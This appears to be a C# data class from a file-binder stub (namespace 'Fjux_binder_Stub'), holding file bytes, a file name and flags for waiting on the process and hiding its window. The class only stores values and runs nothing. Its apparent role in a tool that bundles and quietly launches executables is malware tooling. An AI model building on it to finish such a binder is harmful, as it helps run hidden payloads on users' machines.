namespace Fjux_binder_Stub;

internal class Proccesinfo
{
	private byte[] _fileBytes;

	private string _fileName;

	private bool _waitFor;

	private bool _hidden;

	private bool _noWindow;

	public byte[] FileBytes
	{
		get
		{
			return _fileBytes;
		}
		set
		{
			_fileBytes = value;
		}
	}

	public string FileName
	{
		get
		{
			return _fileName;
		}
		set
		{
			_fileName = value;
		}
	}

	public bool WaitFor
	{
		get
		{
			return _waitFor;
		}
		set
		{
			_waitFor = value;
		}
	}

	public bool Hidden
	{
		get
		{
			return _hidden;
		}
		set
		{
			_hidden = value;
		}
	}

	public bool NoWindow
	{
		get
		{
			return _noWindow;
		}
		set
		{
			_noWindow = value;
		}
	}

	public Proccesinfo()
	{
	}

	public Proccesinfo(byte[] fileBytes, string fileName, bool waitFor, bool hidden, bool noWindow)
	{
		_fileBytes = fileBytes;
		_fileName = fileName;
		_hidden = hidden;
		_noWindow = noWindow;
		_waitFor = waitFor;
	}
}
